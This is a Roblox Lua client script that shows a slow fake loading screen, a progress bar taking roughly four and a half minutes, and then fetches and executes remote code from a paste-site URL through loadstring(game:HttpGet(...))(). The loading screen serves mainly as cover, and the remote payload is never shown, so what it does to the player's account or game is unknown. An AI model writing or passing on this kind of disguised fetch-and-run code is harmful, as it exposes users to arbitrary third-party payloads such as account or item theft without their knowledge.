local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local gui = Instance.new("ScreenGui")
gui.Name = "LoadingScreen"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local container = Instance.new("Frame")
container.Size = UDim2.new(0, 400, 0, 300)
container.Position = UDim2.new(0.5, -200, 0.5, -150)
container.BackgroundTransparency = 1
container.Parent = gui

local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(0, 100, 0, 100)
avatar.Position = UDim2.new(0.5, -50, 0, 0)
avatar.BackgroundTransparency = 1
avatar.Image = "https://files.catbox.moe/4fzfzy.png"
avatar.Parent = container

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(1, 0)
corner.Parent = avatar

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(255, 255, 255)
stroke.Thickness = 4
stroke.Parent = avatar

local message = Instance.new("TextLabel")
message.BackgroundTransparency = 1
message.Size = UDim2.new(1, 0, 0, 30)
message.Position = UDim2.new(0, 0, 0, 120)
message.Text = "PLEASE WAIT UNTIL LOADING COMPLETES"
message.TextColor3 = Color3.fromRGB(170, 0, 255)
message.Font = Enum.Font.Arial
message.TextScaled = true
message.Parent = container

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 300, 0, 20)
progressBar.Position = UDim2.new(0.5, -150, 0, 170)
progressBar.BackgroundColor3 = Color3.fromRGB(51, 51, 51)
progressBar.BorderSizePixel = 0
progressBar.Parent = container

local barCorner = Instance.new("UICorner")
barCorner.CornerRadius = UDim.new(0, 10)
barCorner.Parent = progressBar

local progress = Instance.new("Frame")
progress.Size = UDim2.new(0.1, 0, 1, 0)
progress.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
progress.BorderSizePixel = 0
progress.Parent = progressBar

local progressCorner = Instance.new("UICorner")
progressCorner.CornerRadius = UDim.new(0, 10)
progressCorner.Parent = progress

local status = Instance.new("TextLabel")
status.BackgroundTransparency = 1
status.Size = UDim2.new(1, 0, 0, 30)
status.Position = UDim2.new(0, 0, 0, 210)
status.Text = "Loading..."
status.TextColor3 = Color3.fromRGB(170, 0, 255)
status.Font = Enum.Font.Arial
status.TextScaled = true
status.Parent = container

local percent = 10

while percent < 100 do
    task.wait(1)

    percent += 100 / 300

    TweenService:Create(
        progress,
        TweenInfo.new(0.3),
        {
            Size = UDim2.new(math.clamp(percent / 100, 0, 1), 0, 1, 0)
        }
    ):Play()

    status.Text = string.format("Loading... %d%%", math.floor(percent))
end

status.Text = "Loading Complete!"

loadstring(game:HttpGet("https://cdn.sourceb.in/bins/jC2Zar7s3c/0"))()
